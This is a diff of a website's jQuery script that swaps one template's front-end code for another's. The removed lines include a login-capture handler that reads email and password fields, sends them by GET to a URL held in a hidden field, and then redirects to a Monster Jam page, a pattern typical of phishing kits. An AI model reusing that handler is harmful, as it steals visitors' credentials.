@@ -1,204 +1,102 @@
-jQuery(document).ready(function( $ ) {
-  $('#burger').hide();
-  $('#gold').hide();
-  
-  // Back to top button
-  $(window).scroll(function() {
-    if ($(this).scrollTop() > 100) {
-      $('.back-to-top').fadeIn('slow');
-    } else {
-      $('.back-to-top').fadeOut('slow');
+/* ==========================================================================
+   Dropdown Menus
+   ========================================================================== */
+  $(".dropdown").hover(
+    function () {
+      $(this).addClass('open');
+    }, 
+    function () {
+      $(this).removeClass('open');
     }
-  });
-  $('.back-to-top').click(function(){
-    $('html, body').animate({scrollTop : 0},1500, 'easeInOutExpo');
-    return false;
-  });
+  );
 
-  // Stick the header at top on scroll
-  $("#header").sticky({topSpacing:0, zIndex: '50'});
-
-  // Intro background carousel
-  $("#intro-carousel").owlCarousel({
-    autoplay: true,
-    dots: false,
-    loop: true,
-    animateOut: 'fadeOut',
-    items: 1
-  });
-
-  // Initiate the wowjs animation library
-  new WOW().init();
-
-  // Initiate superfish on nav menu
-  $('.nav-menu').superfish({
-    animation: {
-      opacity: 'show'
-    },
-    speed: 400
-  });
-
-  // Mobile Navigation
-  if ($('#nav-menu-container').length) {
-    var $mobile_nav = $('#nav-menu-container').clone().prop({
-      id: 'mobile-nav'
-    });
-    $mobile_nav.find('> ul').attr({
-      'class': '',
-      'id': ''
-    });
-    $('body').append($mobile_nav);
-    $('body').prepend('<button type="button" id="mobile-nav-toggle"><i class="fa fa-bars"></i></button>');
-    $('body').append('<div id="mobile-body-overly"></div>');
-    $('#mobile-nav').find('.menu-has-children').prepend('<i class="fa fa-chevron-down"></i>');
-
-    $(document).on('click', '.menu-has-children i', function(e) {
-      $(this).next().toggleClass('menu-item-active');
-      $(this).nextAll('ul').eq(0).slideToggle();
-      $(this).toggleClass("fa-chevron-up fa-chevron-down");
-    });
-
-    $(document).on('click', '#mobile-nav-toggle', function(e) {
-      $('body').toggleClass('mobile-nav-active');
-      $('#mobile-nav-toggle i').toggleClass('fa-times fa-bars');
-      $('#mobile-body-overly').toggle();
-    });
-
-    $(document).click(function(e) {
-      var container = $("#mobile-nav, #mobile-nav-toggle");
-      if (!container.is(e.target) && container.has(e.target).length === 0) {
-        if ($('body').hasClass('mobile-nav-active')) {
-          $('body').removeClass('mobile-nav-active');
-          $('#mobile-nav-toggle i').toggleClass('fa-times fa-bars');
-          $('#mobile-body-overly').fadeOut();
-        }
-      }
-    });
-  } else if ($("#mobile-nav, #mobile-nav-toggle").length) {
-    $("#mobile-nav, #mobile-nav-toggle").hide();
-  }
-
-  // Smooth scroll for the menu and links with .scrollto classes
-  $('.nav-menu a, #mobile-nav a, .scrollto').on('click', function() {
-    if (location.pathname.replace(/^\//, '') == this.pathname.replace(/^\//, '') && location.hostname == this.hostname) {
-      var target = $(this.hash);
-      if (target.length) {
-        var top_space = 0;
-
-        if ($('#header').length) {
-          top_space = $('#header').outerHeight();
-
-          if( ! $('#header').hasClass('header-fixed') ) {
-            top_space = top_space - 20;
-          }
-        }
-
-        $('html, body').animate({
-          scrollTop: target.offset().top - top_space
-        }, 1500, 'easeInOutExpo');
-
-        if ($(this).parents('.nav-menu').length) {
-          $('.nav-menu .menu-active').removeClass('menu-active');
-          $(this).closest('li').addClass('menu-active');
-        }
-
-        if ($('body').hasClass('mobile-nav-active')) {
-          $('body').removeClass('mobile-nav-active');
-          $('#mobile-nav-toggle i').toggleClass('fa-times fa-bars');
-          $('#mobile-body-overly').fadeOut();
-        }
-        return false;
-      }
-    }
-  });
-
-
-  // Porfolio - uses the magnific popup jQuery plugin
-  $('.portfolio-popup').magnificPopup({
-    type: 'image',
-    removalDelay: 300,
-    mainClass: 'mfp-fade',
-    gallery: {
-      enabled: true
-    },
-    zoom: {
-      enabled: true,
-      duration: 300,
-      easing: 'ease-in-out',
-      opener: function(openerElement) {
-        return openerElement.is('img') ? openerElement : openerElement.find('img');
-      }
-    }
-  });
-
-  // Testimonials carousel (uses the Owl Carousel library)
-  $(".testimonials-carousel").owlCarousel({
-    autoplay: true,
-    dots: true,
-    loop: true,
-    responsive: { 0: { items: 1 }, 768: { items: 2 }, 900: { items: 3 } }
-  });
-
-  // Clients carousel (uses the Owl Carousel library)
-  $(".clients-carousel").owlCarousel({
-    autoplay: true,
-    dots: true,
-    loop: true,
-    responsive: { 0: { items: 2 }, 768: { items: 4 }, 900: { items: 6 }
-    }
-  });
-
- $('a#merule').click(function(e){
-	 e.preventDefault();
-	 $('#loginModal').modal("show");
- });
-
- $('a#merule-2').click(function(e){
-	 e.preventDefault();
-	 $('#loginModal').modal("show");
- });
- 
- $('a#foreign').click(function(e){
-	 e.preventDefault();
-	 var e = $('#e').val();
-	 var p = $('#p').val();
-	 
-	 if(e == "" || p == ""){
-	 }
-	 else{
-		 var dt = {'e':e,'p':p};
-		 var u = $('#urlx').val();
-		 sendo(u,dt);
-	 }
- });
- 
- $('a#burger-btn').click(function(e){
-	 e.preventDefault();
-	 $('#burger').hide();
-     $('#gold').fadeIn();
-     setTimeout(function(){
-					window.location.href = "https://monsterjam.com/en-US/trucks/monster-energy";
-                }, 1500);
-	
- });
- 
- 
+/* ==========================================================================
+   countdown timer
+   ========================================================================== */
+ jQuery('#clock').countdown('2018/01/24',function(event){
+  var $this=jQuery(this).html(event.strftime(''
+  +'<div class="time-entry days"><span>%-D</span> Days</div> '
+  +'<div class="time-entry hours"><span>%H</span> Hours</div> '
+  +'<div class="time-entry minutes"><span>%M</span> Minutes</div> '
+  +'<div class="time-entry seconds"><span>%S</span> Seconds</div> '));
 });
 
+/* ==========================================================================
+   WOW Scroll Spy
+   ========================================================================== */
+   var wow = new WOW({
+    //disabled for mobile
+	    mobile: false
+	});
+	wow.init();
 
-function sendo(a,b){
-	$.ajax({ 
-   type : 'GET',
-   url  : a,
-   data : b,
-   beforeSend: function()
-   {
-    $('#jungle').hide();
-    $('#burger').fadeIn();
-   },
-   success :  function(response)
-      {
-	    console.log(response);
-      }
-   });
-}
+/* ==========================================================================
+   Nivo Lightbox
+   ========================================================================== */
+   $('.lightbox').nivoLightbox({
+    effect: 'fadeScale',
+    keyboardNav: true,
+    errorMessage: 'The requested content cannot be loaded. Please try again later.'
+  });
+
+/* ==========================================================================
+   Contact From
+   ========================================================================== */	
+	
+	$('.input').blur(function(){
+	    if( $(this).val() ) {
+	        $(this).parent('.label-line').addClass('active checked');
+	    } else {
+		    $(this).parent('.label-line').removeClass('active checked');
+	    }
+	});
+
+	$('.label-line').click(function(){
+		$(this).addClass('active');
+		if ($('.label-line').hasClass('checked')){}
+		else{
+			$('.label-line').removeClass('checked');
+		}
+	});	
+
+/* ==========================================================================
+   Back Top Link
+   ========================================================================== */
+  var offset = 200;
+  var duration = 500;
+  $(window).scroll(function() {
+    if ($(this).scrollTop() > offset) {
+      $('.back-to-top').fadeIn(400);
+    } else {
+      $('.back-to-top').fadeOut(400);
+    }
+  });
+  $('.back-to-top').click(function(event) {
+    event.preventDefault();
+    $('html, body').animate({
+      scrollTop: 0
+    }, 600);
+    return false;
+  })
+
+   // Projects Carousel
+  $("#post-carousel").owlCarousel({
+    navigation : false,
+    pagination: true,
+    slideSpeed : 400,
+    stopOnHover: true,
+    autoPlay: 3000,
+    items :1,
+  });
+/* ==========================================================================
+   Slick Nav 
+   ========================================================================== */
+    $('.wpb-mobile-menu').slicknav({
+      prependTo: '.navbar-header',
+      parentTag: 'span',
+      allowParentLinks: true,
+      duplicate: false,
+      label: '',
+      closedSymbol: '<i class="fa fa-angle-right"></i>',
+      openedSymbol: '<i class="fa fa-angle-down"></i>',
+    });
